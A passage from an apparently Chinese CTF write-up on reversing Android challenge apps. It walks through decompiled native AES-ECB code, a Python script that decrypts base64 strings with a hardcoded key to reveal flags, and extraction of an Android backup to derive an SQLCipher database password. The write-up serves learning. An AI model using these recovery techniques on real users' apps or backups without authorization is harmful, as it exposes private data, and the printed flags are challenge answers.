*, <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),</span><br><span class="line">        result = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">int</span>))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),</span><br><span class="line">        _stack_chk_guard == v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = v4-&gt;functions-&gt;NewString;</span><br><span class="line">    v10 = UNSIGNATURE[<span class="number">0</span>];</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(UNSIGNATURE[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( _stack_chk_guard != v13 );</span><br><span class="line">  result = ((<span class="keyword">int</span> (__fastcall *)(_JNIEnv *, <span class="keyword">char</span> *, <span class="keyword">size_t</span>))v9)(v4, v10, v11);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">AES_128_ECB_PKCS5Padding_Encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// r5</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r5</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v5 = v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = &amp;byte_3BB0[<span class="number">16</span> - v5];</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; v5 )</span><br><span class="line">        v8 = &amp;v3[v7];</span><br><span class="line">      v6[v7++] = *v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v7 != <span class="number">16</span> );</span><br><span class="line">    v9 = <span class="number">16</span>;</span><br><span class="line">    v10 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10</span>u);</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);</span><br><span class="line">      ++v16;</span><br><span class="line">      v15 += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 &lt; v11 );</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = (v4 + <span class="number">16</span>) &amp; <span class="number">0xFFFFFFF0</span>;</span><br><span class="line">  v12 = <span class="built_in">malloc</span>(v9);</span><br><span class="line">  v6 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((v5 + <span class="number">16</span>) &amp; <span class="number">0xFFFFFFF0</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v13 &gt;= v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(v5 &amp; <span class="number">0xF</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v12[v13] = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">      v14 = byte_3BB0[v9 - v5];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v14 = v3[v13];</span><br><span class="line">    &#125;</span><br><span class="line">    v12[v13] = v14;</span><br><span class="line">LABEL_15:</span><br><span class="line">    ++v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 != v13 );</span><br><span class="line">  v10 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((v5 + <span class="number">16</span>) &amp; <span class="number">0xFFFFFFF0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &gt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = v9 / <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">  v17 = j_b64_encode((<span class="keyword">int</span>)v10, v9);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="built_in">free</span>(v10);</span><br><span class="line">  <span class="keyword">return</span> v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 Python 脚本解密得到明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'thisisatestkey=='</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">'VEIzd/V2UPYNdn/bxH3Xig=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="keyword">print</span> aes.decrypt(ciphertext)</span><br><span class="line"><span class="comment"># aimagetencent</span></span><br></pre></td></tr></table></figure><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tencent.testvuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> com.tencent.testvuln.c.Encryto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDataActivity</span> <span class="keyword">extends</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> TextView c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main3);</span><br><span class="line">        <span class="keyword">this</span>.c = (TextView) findViewById(R.id.textView1);</span><br><span class="line">        <span class="keyword">this</span>.c.setText(Encryto.decode(<span class="keyword">this</span>, <span class="string">"9YuQ2dk8CSaCe7DTAmaqAA=="</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后用这里的密文解密得到了 flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ciphertext2 = <span class="string">'9YuQ2dk8CSaCe7DTAmaqAA=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="keyword">print</span> aes.decrypt(ciphertext2)</span><br><span class="line"><span class="comment"># Cas3_0f_A_CAK3</span></span><br></pre></td></tr></table></figure><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ xxd app3.ab | head</span><br><span class="line">00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.2</span><br><span class="line">00000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o</span><br><span class="line">00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.</span><br><span class="line">00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .<span class="string">"=....H...s0F#(</span></span><br><span class="line"><span class="string">00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#."</span>H..RR.</span><br><span class="line">00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .&#125;..u....&lt;9...u.</span><br><span class="line">00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u&#125;.......PE..</span><br><span class="line">00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,</span><br><span class="line">00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..<span class="comment">#@!.......G.S.</span></span><br><span class="line">00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</span><br></pre></td></tr></table></figure><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar abe.jar unpack app3.ab app3.tar <span class="string">""</span></span><br><span class="line">0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%</span><br><span class="line">9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</span><br></pre></td></tr></table></figure><p>在解压得到的 tar 包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ x app3.tar</span><br><span class="line">x apps/com.example.yaphetshan.tencentwelcome/a/base.apk</span><br><span class="line">x apps/com.example.yaphetshan.tencentwelcome/db/Demo.db</span><br><span class="line">x apps/com.example.yaphetshan.tencentwelcome/Encryto.db</span><br><span class="line">x apps/com.example.yaphetshan.tencentwelcome/_manifest</span><br></pre></td></tr></table></figure><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> com.example.yaphetshan.tencentwelcome.a.a;</span><br><span class="line"><span class="keyword">import</span> net.sqlcipher.database.SQLiteDatabase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase a;</span><br><span class="line">    <span class="keyword">private</span> a b;</span><br><span class="line">    <span class="keyword">private</span> Button c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_main);</span><br><span class="line">        <span class="keyword">this</span>.c = (Button) findViewById(R.id.add_data);</span><br><span class="line">        <span class="keyword">this</span>.c.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        Editor edit = getSharedPreferences(<span class="string">"test"</span>, <span class="number">0</span>).edit();</span><br><span class="line">        edit.putString(<span class="string">"Is_Encroty"</span>, <span class="string">"1"</span>); <span class="comment">// Is_Encroty="1"</span></span><br><span class="line">        edit.putString(<span class="string">"Encryto"</span>, <span class="string">"SqlCipher"</span>); <span class="comment">// Encryto="SqlCipher"</span></span><br><span class="line">        edit.putString(<span class="string">"ver_sion"</span>, <span class="string">"3_4_0"</span>); <span class="comment">// ver_sion="3_4_0"</span></span><br><span class="line">        edit.apply();</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SQLiteDatabase.loadLibs(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.b = <span class="keyword">new</span> a(<span class="keyword">this</span>, <span class="string">"Demo.db"</span>, <span class="keyword">null</span>, <span class="number">1</span>); <span class="comment">// 打开Demo.db</span></span><br><span class="line">        ContentValues contentValues = <span class="keyword">new</span> ContentValues();</span><br><span class="line">        contentValues.put(<span class="string">"name"</span>, <span class="string">"Stranger"</span>); <span class="comment">// name="Stanger"</span></span><br><span class="line">        contentValues.put(<span class="string">"password"</span>, Integer.valueOf(<span class="number">123456</span>)); <span class="comment">// password=123456</span></span><br><span class="line">        a aVar = <span class="keyword">new</span> a();</span><br><span class="line">        String a = aVar.a(contentValues.getAsString(<span class="string">"name"</span>), contentValues.getAsString(<span class="string">"password"</span>)); <span class="comment">// a = name[:4] + password[:4]</span></span><br><span class="line">        <span class="keyword">this</span>.a = <span class="keyword">this</span>.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(<span class="string">"password"</span>))).substring(<span class="number">0</span>, <span class="number">7</span>)); <span class="comment">// 将SHA1(a+MD5(a)+"yaphetshan")[:7]作为密码，获取指定数据库接口</span></span><br><span class="line">        <span class="keyword">this</span>.a.insert(<span class="string">"TencentMicrMsg"</span>, <span class="keyword">null</span>, contentValues); <span class="comment">// 将数据contentValues插入表TencentMicrMsg</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (view == <span class="keyword">this</span>.c) &#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">            intent.putExtra(<span class="string">"name"</span>, <span class="string">"name"</span>);</span><br><span class="line">            intent.putExtra(<span class="string">"password"</span>, <span class="string">"pass"</span>);</span><br><span class="line">            intent.setClass(<span class="keyword">this</span>, AnotherActivity.class);</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> net.sqlcipher.database.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> net.sqlcipher.database.SQLiteDatabase.CursorFactory;</span><br><span class="line"><span class="keyword">import</span> net.sqlcipher.database.SQLiteOpenHelper;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: DatabaseManager */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> <span class="keyword">extends</span> <span class="title">SQLiteOpenHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(Context context, String str, CursorFactory cursorFactory, <span class="keyword">int</span> i)</span> </span>&#123; <span class="comment">// 打开指定数据库</span></span><br><span class="line">        <span class="keyword">super</span>(context, str, cursorFactory, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(SQLiteDatabase sQLiteDatabase)</span> </span>&#123;</span><br><span class="line">        sQLiteDatabase.execSQL(<span class="string">"create table TencentMicrMsg(name text,password integer,F_l_a_g text)"</span>); <span class="comment">// 表TencentMicrMsg中三个字段分别是text、integer和text</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onUpgrade</span><span class="params">(SQLiteDatabase sQLiteDatabase, <span class="keyword">int</span> i, <span class="keyword">int</span> i2)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome.a;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: Cipher */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String a = <span class="string">"yaphetshan"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">        String substring = str.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> substring + str2.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">b</span><span class="params">(String str, String str2)</span> </span>&#123; <span class="comment">// 返回MD5十六进制字符串</span></span><br><span class="line">        b bVar = <span class="keyword">new</span> b();</span><br><span class="line">        <span class="keyword">return</span> b.a(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123; <span class="comment">// 返回SHA1(str+"yaphetshan")的十六进制字符串</span></span><br><span class="line">        b bVar = <span class="keyword">new</span> b();</span><br><span class="line">        <span class="keyword">return</span> b.b(str + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome.a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: SHA1Manager */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123; <span class="comment">// 获取MD5十六进制字符串</span></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = str.getBytes();</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">            instance.update(bytes);</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest(); <span class="comment">// 获取MD5哈希摘要</span></span><br><span class="line">            <span class="keyword">int</span> length = digest.length;</span><br><span class="line">            <span class="keyword">char</span>[] cArr2 = <span class="keyword">new</span> <span class="keyword">char</span>[(length * <span class="number">2</span>)];</span><br><span class="line">            <span class="keyword">int</span> i2 = <span 